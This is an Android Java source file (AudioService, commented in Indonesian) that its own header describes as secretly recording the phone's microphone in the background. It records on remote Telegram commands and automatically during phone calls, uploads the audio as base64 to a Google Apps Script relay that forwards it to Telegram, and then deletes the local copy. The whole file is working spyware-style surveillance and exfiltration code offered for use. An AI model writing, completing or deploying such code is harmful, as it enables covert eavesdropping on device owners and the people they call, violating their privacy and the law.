package com.example.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Merekam audio dari mikrofon HP secara diam-diam di background.
 *
 * Mode:
 * - MODE_RECORD : rekam manual dari perintah Telegram (/record [detik])
 * - MODE_CALL   : rekam otomatis saat ada panggilan telepon aktif
 *
 * Alur:
 * 1. AudioPollingService atau CallReceiver memanggil AudioService.start()
 * 2. Rekam dimulai otomatis menggunakan MediaRecorder
 * 3. Setelah durasi habis (atau perintah STOP untuk mode panggilan),
 *    file audio di-upload ke GAS dalam format base64
 * 4. GAS meneruskan audio ke Telegram menggunakan sendAudio
 * 5. File audio di cache HP dihapus otomatis
 *
 * Wajib di AndroidManifest.xml:
 *   <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE"/>
 *
 *   <service
 *       android:name=".AudioService"
 *       android:exported="false"
 *       android:foregroundServiceType="microphone"/>
 */
public class AudioService extends Service {

    private static final String TAG            = "AudioService";
    private static final String CHANNEL_ID     = "audio_record";
    private static final int    NOTIFICATION_ID = 5001;

    public static final String EXTRA_REQUEST_ID = "requestId";
    public static final String EXTRA_DURATION   = "duration";
    public static final String EXTRA_MODE       = "mode";

    // Aksi untuk menghentikan rekaman lebih awal (dipakai saat panggilan berakhir)
    public static final String ACTION_STOP = "com.example.app.STOP_RECORDING";

    public static final String MODE_RECORD = "record";
    public static final String MODE_CALL   = "call";

    private static final int DEFAULT_DURATION_SEC = 30;
    private static final int MAX_DURATION_SEC     = 300; // 5 menit

    private MediaRecorder mediaRecorder;
    private File          audioFile;
    private Handler       handler;
    private String        requestId;
    private int           durationSec;
    private String        mode;
    private boolean       isRecording = false;

    // =========================================================
    // LIFECYCLE SERVICE
    // =========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        handler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {

        // Terima perintah stop dari CallReceiver saat panggilan berakhir
        if (intent != null && ACTION_STOP.equals(intent.getAction())) {
            Log.d(TAG, "Terima STOP — menghentikan rekaman lebih awal");
            stopRecordingAndUpload();
            return START_NOT_STICKY;
        }

        if (intent != null) {
            requestId   = intent.getStringExtra(EXTRA_REQUEST_ID);
            durationSec = intent.getIntExtra(EXTRA_DURATION, DEFAULT_DURATION_SEC);
            mode        = intent.getStringExtra(EXTRA_MODE);
            if (mode == null) mode = MODE_RECORD;
        }

        // Clamp durasi antara 5 detik dan MAX
        if (durationSec < 5)               durationSec = 5;
        if (durationSec > MAX_DURATION_SEC) durationSec = MAX_DURATION_SEC;

        startForeground(NOTIFICATION_ID, buildNotification());
        startRecording();

        return START_NOT_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        handler.removeCallbacksAndMessages(null);
        releaseRecorder();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // =========================================================
    // REKAM AUDIO
    // =========================================================

    private void startRecording() {

        try {
            File outputDir = new File(getCacheDir(), "audio");
            if (!outputDir.exists() && !outputDir.mkdirs()) {
                Log.e(TAG, "Gagal buat direktori cache audio");
                cancelRequest();
                return;
            }

            String timestamp = new SimpleDateFormat(
                    "yyyyMMdd_HHmmss", Locale.US
            ).format(new Date());

            audioFile = new File(outputDir, "REC_" + timestamp + ".m4a");

            mediaRecorder = new MediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioEncodingBitRate(64000);
            mediaRecorder.setAudioSamplingRate(44100);
            mediaRecorder.setOutputFile(audioFile.getAbsolutePath());
            mediaRecorder.prepare();
            mediaRecorder.start();

            isRecording = true;

            Log.d(TAG, "Rekam dimulai: " + audioFile.getName()
                    + " | durasi=" + durationSec + "s"
                    + " | mode=" + mode);

            // Hentikan otomatis setelah durasi habis
            handler.postDelayed(
                    this::stopRecordingAndUpload,
                    durationSec * 1000L
            );

        } catch (Exception e) {
            Log.e(TAG, "Gagal mulai rekam", e);
            cancelRequest();
        }
    }

    private void stopRecordingAndUpload() {

        if (!isRecording) return;
        isRecording = false;

        handler.removeCallbacksAndMessages(null);

        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
                mediaRecorder.release();
                mediaRecorder = null;
            }
            Log.d(TAG, "Rekam selesai, mulai upload");
            uploadAudio();
        } catch (Exception e) {
            Log.e(TAG, "Gagal stop rekam", e);
            cancelRequest();
        }
    }

    private void releaseRecorder() {
        if (mediaRecorder != null) {
            try { mediaRecorder.release(); } catch (Exception ignored) {}
            mediaRecorder = null;
        }
    }

    // =========================================================
    // UPLOAD AUDIO
    // =========================================================

    private void uploadAudio() {

        if (audioFile == null || !audioFile.exists() || audioFile.length() == 0) {
            Log.e(TAG, "File audio tidak valid");
            cancelRequest();
            return;
        }

        final String currentRequestId = requestId;
        final File   file             = audioFile;
        final int    duration         = durationSec;
        final String currentMode      = mode;

        new Thread(() -> {

            boolean uploaded = ApiHelper.sendAudioResult(
                    getApplicationContext(),
                    currentRequestId,
                    file,
                    duration,
                    currentMode
            );

            Log.d(TAG, uploaded ? "Upload audio berhasil" : "Upload audio gagal");

            // Hapus file cache setelah upload
            if (file.exists()) {
                if (!file.delete()) file.deleteOnExit();
            }

            stopSelf();

        }).start();
    }

    // =========================================================
    // CANCEL
    // =========================================================

    private void cancelRequest() {
        final String id = requestId;
        if (id != null && !id.trim().isEmpty()) {
            new Thread(() ->
                    ApiHelper.updateAudioRequestStatus(id, "CANCELLED")
            ).start();
        }
        stopSelf();
    }

    // =========================================================
    // NOTIFIKASI
    // =========================================================

    private Notification buildNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Rekam Audio", NotificationManager.IMPORTANCE_LOW
            );
            channel.setSound(null, null);
            channel.setShowBadge(false);
            channel.enableVibration(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        String contentText = MODE_CALL.equals(mode)
                ? "Merekam panggilan telepon..."
                : "Merekam " + durationSec + " detik...";

        Notification.Builder builder =
                new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Merekam audio")
                        .setContentText(contentText)
                        .setSmallIcon(android.R.drawable.ic_btn_speak_now)
                        .setOngoing(true);

        return builder.build();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    public static void start(
            Context context,
            String requestId,
            int durationSec,
            String mode) {

        Intent intent = new Intent(context, AudioService.class);
        intent.putExtra(EXTRA_REQUEST_ID, requestId);
        intent.putExtra(EXTRA_DURATION,   durationSec);
        intent.putExtra(EXTRA_MODE,       mode);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stop(Context context) {
        Intent intent = new Intent(context, AudioService.class);
        intent.setAction(ACTION_STOP);
        context.startService(intent);
    }
}
